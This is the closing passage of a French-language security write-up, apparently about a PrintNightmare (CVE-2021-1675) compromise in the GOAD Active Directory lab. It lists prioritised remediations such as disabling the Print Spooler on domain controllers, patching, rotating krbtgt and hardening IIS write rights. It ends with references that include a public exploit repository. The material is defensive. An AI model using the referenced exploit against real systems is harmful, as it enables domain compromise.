| CRITIQUE | Désactiver spooler sur tous les DC | `Stop-Service Spooler; Set-Service Spooler -StartupType Disabled` | 0-24h |
| CRITIQUE | Appliquer KB5004945 + KB5004946 | Windows Update / WSUS | 0-24h |
| CRITIQUE | Rotation krbtgt essos.local (x2) | `Set-ADAccountPassword -Identity krbtgt` | 0-24h |
| ELEVE | Bloquer les chemins UNC pour le spooler | GPO — Point and Print Restrictions | J+1 |
| ELEVE | Déployer FIM sur `C:\inetpub\wwwroot\` | Sysmon Event ID 11 + alerte SIEM | J+1 |
| ELEVE | Restreindre droits d'écriture répertoire IIS | ACL — supprimer WRITE pour non-admins | J+1 |

### Commande de désactivation immédiate sur tous les DC

```powershell
# A executer sur MEEREEN
Stop-Service -Name Spooler -Force
Set-Service -Name Spooler -StartupType Disabled
```

---

## Références

| Référence | URL |
|-----------|-----|
| Mayfly277 GOAD Part 5 | https://mayfly277.github.io/posts/GOADv2-pwning-part5/ |
| CVE-2021-1675 | https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675 |
| cube0x0 exploit | https://github.com/cube0x0/CVE-2021-1675 |
| KB5004945 patch | https://support.microsoft.com/kb/5004945 |
| MITRE T1068 | https://attack.mitre.org/techniques/T1068/ |

